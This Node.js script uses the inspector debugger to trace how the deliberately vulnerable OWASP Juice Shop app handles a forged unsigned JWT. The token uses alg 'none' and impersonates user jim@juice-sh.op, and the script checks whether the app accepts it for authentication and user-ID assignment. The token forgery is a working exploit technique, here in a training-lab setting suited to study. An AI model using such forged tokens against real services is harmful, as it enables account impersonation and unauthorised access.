const inspector = require('inspector');
const path = require('path');
const session = new inspector.Session();
session.connect();
function post(method, params={}) { return new Promise((resolve, reject) => session.post(method, params, (err, res) => err ? reject(err) : resolve(res))); }
const pauses = [];
session.on('Debugger.paused', msg => {
  pauses.push({
    reason: msg.params.reason,
    hitBreakpoints: msg.params.hitBreakpoints,
    frames: msg.params.callFrames.slice(0,5).map(f => ({functionName: f.functionName, url: f.url, line: f.location.lineNumber + 1, column: f.location.columnNumber + 1}))
  });
  session.post('Debugger.resume');
});
function b64(o){return Buffer.from(JSON.stringify(o)).toString('base64url')}
(async () => {
  await post('Debugger.enable');
  const sec = require(path.resolve('build/lib/insecurity.js'));
  const url = 'file://' + path.resolve('build/lib/insecurity.js');
  await post('Debugger.setBreakpointByUrl', { url, lineNumber: 212-1 });
  await post('Debugger.setBreakpointByUrl', { url, lineNumber: 215-1 });
  await post('Debugger.setBreakpointByUrl', { url, lineNumber: 200-1 });
  const payload = {status:'success', data:{id:2, email:'jim@juice-sh.op', role:'customer'}};
  const token = b64({typ:'JWT', alg:'none'}) + '.' + b64(payload) + '.';
  const req = { headers: {authorization: 'Bearer ' + token}, cookies: {}, body: {} };
  const res = { cookie: (k,v) => { console.log('res.cookie', k, v.slice(0,30)+'...'); }, status: c => ({ json: o => console.log('status', c, JSON.stringify(o)) }) };
  console.log('token_alg_none', token);
  console.log('before_cache_entry', sec.authenticatedUsers.get(token));
  sec.updateAuthenticatedUsers()(req, res, () => console.log('update_next_called'));
  console.log('after_cache_data_id', sec.authenticatedUsers.get(token)?.data?.id);
  sec.appendUserId()(req, res, () => console.log('append_next_called'));
  console.log('req.body.UserId', req.body.UserId);
  setTimeout(() => { console.log('debugger_pauses', JSON.stringify(pauses, null, 2)); session.disconnect(); }, 50);
})();
